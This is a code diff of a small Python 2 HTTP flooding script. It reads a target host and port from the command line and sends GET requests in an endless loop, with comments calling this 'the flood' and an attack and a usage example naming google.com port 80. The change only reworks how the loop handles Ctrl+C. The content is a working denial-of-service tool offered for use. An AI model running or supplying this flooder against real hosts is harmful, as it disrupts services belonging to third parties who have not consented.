@@ -15,16 +15,14 @@ cls()
 if len(sys.argv) >= 3: # verify argumentes
     host = sys.argv[1]
     port = sys.argv[2]
-    try:
-        while 1: # start the flood
+    while 1: # start the flood
+        try:
             counter += 1
-            requests.get('http://'+host+':'+port) # >>> send request to target
+            requests.get('http://'+host+':'+port) # >>> send get request to target
             sys.stdout.write('\r[+] Sending request '+str(counter)+' to '+host+':'+port)
-    except KeyboardInterrupt:
-        info()
-        sys.exit()
-        _exit(0)
-
+        except KeyboardInterrupt: # Stop attack if user press (control + c)
+            info()
+            break
 else: # print correct usage
     print '###############################\nUsage: %s <target> <port>' % (sys.argv[0].split("\\"))[::-1][0]
     print 'Ex: %s google.com 80\n###############################' % (sys.argv[0].split("\\"))[::-1][0]
